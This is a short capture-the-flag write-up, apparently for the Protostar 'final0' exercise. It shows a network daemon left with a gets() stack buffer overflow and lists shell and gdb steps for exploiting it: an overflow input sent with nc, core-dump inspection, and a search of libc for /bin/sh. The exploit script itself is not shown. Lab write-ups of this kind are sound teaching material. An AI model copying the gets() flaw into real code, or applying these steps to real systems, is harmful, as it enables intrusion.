
# Final0

### Task
```
  #include "../common/common.c"

  #define NAME "final0"
  #define UID 0
  #define GID 0
  #define PORT 2995

  /*
  * Read the username in from the network
  */

  char *get_username()
  {
    char buffer[512];
    char *q;
    int i;

    memset(buffer, 0, sizeof(buffer));
    gets(buffer);

    /* Strip off trailing new line characters */
    q = strchr(buffer, '\n');
    if(q) *q = 0;
    q = strchr(buffer, '\r');
    if(q) *q = 0;

    /* Convert to lower case */
    for(i = 0; i < strlen(buffer); i++) {
        buffer[i] = toupper(buffer[i]);
    }

    /* Duplicate the string and return it */
    return strdup(buffer);
  }

  int main(int argc, char **argv, char **envp)
  {
    int fd;
    char *username;

    /* Run the process as a daemon */
    background_process(NAME, UID, GID); 
    
    /* Wait for socket activity and return */
    fd = serve_forever(PORT);

    /* Set the client socket to STDIN, STDOUT, and STDERR */
    set_io(fd);

    username = get_username();
    
    printf("No such user %s\n", username);
  }
```

### Solution
```
  python -c "print('a' * 532 + 'b'*4)" | nc 127.0.0.1 2995
  ls /tmp
  gdb final0 /tmp/core.11.final0.1586
      info registers
      quit
  pidof final0
  gdb -p 1343
    info functions @plt
    quit
  cat /proc/1343/maps
  grep -R -a -b -o /bin/sh /lib/libc.so.6
  nano f0.py
  python f0.py
```
![stack 6(1)](./img/7(1).png)
![stack 6(2)](./img/7(2).png)
![stack 6(3)](./img/7(3).png)
![stack 6(4)](./img/7(4).png)
![stack 6(5)](./img/7(5).png)
![stack 6(6)](./img/7(6).png)
![stack 6(6)](./img/7(7).png)

